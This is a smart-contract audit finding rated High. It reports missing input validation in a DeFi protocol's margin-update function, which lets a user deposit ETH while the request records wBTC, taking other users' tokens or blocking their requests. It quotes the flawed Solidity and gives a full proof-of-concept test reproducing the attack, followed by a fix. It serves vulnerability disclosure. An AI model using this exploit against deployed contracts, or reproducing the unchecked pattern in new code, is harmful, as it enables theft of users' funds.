---
id: 22865
severity: "High"
---

# Users can use weth to replace any margin to-

## Description

Function createUpdatePositionMarginRequest lack enough input validation. This will cause users can use weth as any margin tokens to earn profits or block other users' normal request. In function createUpdatePositionMarginRequest, users will transfer some tokens if they want to increase their position's init margin amount. If params.isNativeToken is true, users need to transfer WETH, otherwise, users need to transfer margin token. The vulnerability is that when we create one request via createUpdatePositionMarginRequest, params.marginToken is used as request.marginToken. So if the input params.isNativeToken is true and params.marginToken is not WETH, for example, the updated position is one wBTC position, we will transfer some amount of ether to the Trade Vault when we create one request, and then when the keeper execute the request, system will transfer the same amount of wBTC to LP Pool. In normal cases, the request cannot be executed successfully, because there is not enough wBTC in Trade Vault. However, considering that there are lots of request now, and traders are transferring their wBTC to Trade Vault, the hacker can make use of this vulnerability to use WETH to get the same amount of other tokens.
```solidity
function createUpdatePositionMarginRequest(UpdatePositionMarginParams calldata params) external payable override {
    if (params.isAdd) {
        require(!params.isNativeToken || msg.value == params.updateMarginAmount, "Deposit eth amount error!");

        AssetsProcess.depositToVault(
            AssetsProcess.DepositParams(
                account,
                params.isNativeToken ? AppConfig.getChainConfig().wrapperToken : params.marginToken,
                params.updateMarginAmount,
                AssetsProcess.DepositFrom.ORDER,
                params.isNativeToken
            )
        );
    }
    PositionMarginProcess.createUpdatePositionMarginRequest(
        account,
        params,
        updateMarginAmount,
        isExecutionFeeFromTradeVault
    );
}

function createUpdatePositionMarginRequest(
    address account,
    IPosition.UpdatePositionMarginParams memory params,
    uint256 updateMarginAmount,
    bool isExecutionFeeFromTradeVault
) external {
    uint256 requestId = UuidCreator.nextId(UPDATE_MARGIN_ID_KEY);
    UpdatePositionMargin.Request storage request = UpdatePositionMargin.create(requestId);

    request.account = account;
    request.positionKey = params.positionKey;
    request.marginToken = params.marginToken;
    request.updateMarginAmount = updateMarginAmount;
    request.isAdd = params.isAdd;
    request.isExecutionFeeFromTradeVault = isExecutionFeeFromTradeVault;
    request.executionFee = params.executionFee;
    request.lastBlock = ChainUtils.currentBlock();
    emit CreateUpdatePositionMarginEvent(requestId, request);
}

function updatePositionMargin(uint256 requestId, UpdatePositionMargin.Request memory request) external {
    Position.Props storage position = Position.load(request.positionKey);
    Symbol.Props memory symbolProps = Symbol.load(position.symbol);
    Account.Props storage accountProps = Account.load(request.account);
    //add margin, transfer from vault to LP Pool
    if (request.isAdd) {
        AddPositionMarginCache memory cache;
        cache.stakeToken = symbolProps.stakeToken;
        cache.addMarginAmount = request.updateMarginAmount;
        cache.marginTokenDecimals = TokenUtils.decimals(position.marginToken);
        cache.marginTokenPrice = OracleProcess.getLatestUsdUintPrice(position.marginToken, !position.isLong);
        cache.isCrossMargin = false;
        _executeAddMargin(position, cache);
        VaultProcess.transferOut(
            IVault(address(this)).getTradeVaultAddress(),
            request.marginToken,
            symbolProps.stakeToken,
            cache.addMarginAmount
        );
        position.emitPositionUpdateEvent(requestId, Position.PositionUpdateFrom.ADD_MARGIN, 0);
    }
```
• Users can use Ether to get the same amount of other tokens. This may get some profits.
• Other users' normal request may be blocked and may not be cancelled because there is not enough balance to return back.

## Proof of Concept

Add this test in increaseMarketOrder.test.ts, the procedure is like:
• User0 open one Long BTC position.
• User1 open one Long BTC position.
• User0 create one update margin request, with isNative = true, transfer ETHER to Trade Vault
• User1 create one normal update margin request, transfer wBTC to the Trade Vault.
• Keeper execute user0's request, transfer wBTC to LP Pool.
• If there's no enough wBTC balance in Trade Vault, user1's request cannot be executed.
```solidity
it.only('Case2: update margin request', async function () {
    // Step 1: user0 create one position BTC
    console.log("User0 Long BTC ");
    const orderMargin1 = precision.token(1, 17) // 0.1BTC
    const btcPrice1 = precision.price(50000)
    const btcOracle1 = [{ token: wbtcAddr, minPrice: btcPrice1, maxPrice: btcPrice1 }]

    const executionFee = precision.token(2, 15)
    await handleOrder(fixture, {
        orderMargin: orderMargin1,
        oracle: btcOracle1,
        marginToken: wbtc,
        account: user0,
        symbol: btcUsd,
        executionFee: executionFee,
    })
    // Step 2: user1 create one position BTC
    console.log("User1 Long BTC");
    await handleOrder(fixture, {
        orderMargin: orderMargin1,
        oracle: btcOracle1,
        marginToken: wbtc,
        account: user1,
        symbol: btcUsd,
        executionFee: executionFee,
    })
    // Step 3: user0
    console.log("User0 update position")
    // user0 use weth
    let positionInfo = await positionFacet.getSinglePosition(user0.address, btcUsd, wbtcAddr, false)

    console.log(positionInfo.key);
    console.log(positionInfo.initialMargin);
    let tx = await positionFacet.connect(user0).createUpdatePositionMarginRequest(
        {
            positionKey: positionInfo.key,
            isAdd: true,
            isNativeToken: true,
            marginToken: wbtc,
            updateMarginAmount: precision.token(1, 17),
            executionFee: executionFee,
        },
        {
            value: precision.token(1, 17),
        },
    )
    await tx.wait()
    // Step 3.1 check
    const wethTradeVaultBalance = BigInt(await weth.balanceOf(tradeVaultAddr))
    console.log("WETH in trade vault: ", wethTradeVaultBalance);
    let requestId = await marketFacet.getLastUuid(UPDATE_MARGIN_ID_KEY)
    console.log("Request Id: ", requestId);
    // Step 4: user1
    console.log("User1 update position")
    // user1 use wbtc
    positionInfo = await positionFacet.getSinglePosition(user1.address, btcUsd, wbtcAddr, false)

    console.log(positionInfo.key);
    console.log(positionInfo.initialMargin);
    wbtc.connect(user1).approve(diamondAddr, precision.token(1, 17))
    tx = await positionFacet.connect(user1).createUpdatePositionMarginRequest(
        {
            positionKey: positionInfo.key,
            isAdd: true,
            isNativeToken: false,
            marginToken: wbtc,
            updateMarginAmount: precision.token(1, 17),
            executionFee: executionFee,
        },
        {
            value: executionFee,
        },
    )
    await tx.wait()
    // Step 3.1 check
    let wbtcTradeVaultBalance = BigInt(await wbtc.balanceOf(tradeVaultAddr))
    console.log("wbtc in trade vault: ", wbtcTradeVaultBalance);
    // Step 5: execute user0 update request
    const tokenPrice = precision.price(50000)
    const oracle = [{ token: wbtcAddr, targetToken: ethers.ZeroAddress, minPrice: tokenPrice, maxPrice: tokenPrice }]

    tx = await positionFacet.connect(user3).executeUpdatePositionMarginRequest(requestId, oracle)

    await tx.wait()
    wbtcTradeVaultBalance = BigInt(await wbtc.balanceOf(tradeVaultAddr))
    console.log("wbtc in trade vault: ", wbtcTradeVaultBalance);
})
```

## Recommendation

Add the related input validation. If isNative is true, we need to make sure the related position's margin token is WETH.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract allows a trader to create a margin‑update request by calling createUpdatePositionMarginRequest. The function accepts a flag isNativeToken that indicates whether the caller will send the chain’s native token (wrapped as WETH) and also receives a marginToken address supplied by the caller. The implementation stores params.marginToken directly in the request structure without checking that the token matches the flag. Consequently an attacker can set isNativeToken to true while providing a different token address, for example a wBTC address, and still send ether as msg.value. The deposit step records the native token deposit in the vault, but the request records the margin token as wBTC. When a keeper later executes the request, the system attempts to transfer the recorded margin token (wBTC) from the Trade Vault to the liquidity pool, even though only ether was deposited. If other pending requests have supplied wBTC to the vault, the keeper will pull those tokens to satisfy the mismatched request, effectively swapping the attacker’s ether for other users’ tokens. This token‑type mismatch can be used to profit by converting ether into other assets without proper accounting, or to block legitimate margin‑increase requests because the vault no longer holds enough of the expected token. The vulnerability appears only when a request is created with isNativeToken true and a non‑native marginToken, a condition that is not validated at input time. From a user perspective the symptoms are a margin increase that never materialises, a sudden loss of the expected token balance in the vault, and other users’ requests getting stuck. The issue is a classic case of insufficient input validation leading to asset misallocation, a token substitution bug that violates the protocol’s accounting assumptions. The flaw was discovered during a manual audit by reviewing the request‑creation logic and reproducing the scenario in a test that showed ether being accepted while the request claimed a different token. To remediate, the contract should enforce that when isNativeToken is true the marginToken field must equal the configured wrapper token (WETH) and reject any mismatched combination, thereby preventing the vault from recording inconsistent token types.
